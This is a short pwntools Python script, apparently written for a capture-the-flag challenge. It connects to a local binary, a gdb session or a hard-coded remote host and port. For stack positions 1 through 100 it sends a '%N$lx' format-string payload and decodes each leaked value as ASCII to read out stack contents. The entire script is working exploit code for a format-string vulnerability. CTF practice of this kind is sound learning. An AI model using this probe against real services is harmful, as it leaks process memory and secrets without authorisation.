from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def hex_to_ascii(hex_str):
    try:
        # Remove 'b' prefix and quotes if present
        hex_str = hex_str.strip().decode().replace("b'", "").replace("'", "")
        # Remove newline characters
        hex_str = hex_str.strip()
        # Convert hex to bytes then to ASCII, ignore errors
        return bytes.fromhex(hex_str).decode('ascii', errors='ignore')
    except:
        return "Non-printable or invalid hex"

def solve(): 
    for i in range(1,101):
        p = conn()
        p.sendline("%"+str(i)+"$lx")  # inject format string payload
        response = p.recvline()
        hex_value = response
        ascii_value = hex_to_ascii(hex_value)
        print(f"Position {i}: Hex={hex_value.strip()} ASCII={ascii_value}")
        p.close()

solve()